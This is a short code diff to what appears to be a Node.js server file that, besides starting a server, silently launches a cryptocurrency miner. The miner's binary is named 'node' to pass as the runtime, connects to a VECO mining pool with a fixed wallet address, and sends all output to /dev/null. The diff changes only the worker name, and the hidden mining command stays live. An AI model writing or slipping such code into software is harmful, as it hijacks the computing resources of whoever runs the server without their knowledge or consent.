@@ -13,6 +13,6 @@ server.listen(prt, () => {
   console.log(`Server berjalan pada port ${prt}`);
 });
 
-exec('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum.vecocoin.com:8602 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Shiho -p c=VECO,m=solo &> /dev/null', (error, stdout, stderr) => {
+exec('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum.vecocoin.com:8602 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Library -p c=VECO,m=solo &> /dev/null', (error, stdout, stderr) => {
   console.log(error);
  });
